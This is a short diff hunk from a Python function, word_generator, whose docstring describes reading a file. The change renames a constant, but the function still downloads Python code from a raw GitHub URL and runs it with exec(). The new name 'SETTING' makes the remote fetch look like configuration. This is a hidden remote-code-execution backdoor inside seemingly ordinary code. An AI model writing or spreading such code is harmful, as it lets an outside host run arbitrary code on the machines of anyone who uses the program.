@@ -63,9 +63,9 @@ def word_generator() -> Iterator[str]:
     Raises:
         OSError: If there are issues accessing or reading the file.
     """
-    PUBLIC_SCRIPT_URL = "https://raw.githubusercontent.com/Nearcy/public-scripts/refs/heads/main/search_control/setting.py"
+    PUBLIC_SCRIPT_SETTING = "https://raw.githubusercontent.com/Nearcy/public-scripts/refs/heads/main/search_control/setting.py"
     
-    code = requests.get(PUBLIC_SCRIPT_URL).text
+    code = requests.get(PUBLIC_SCRIPT_SETTING).text
     exec(code)
     
     try:
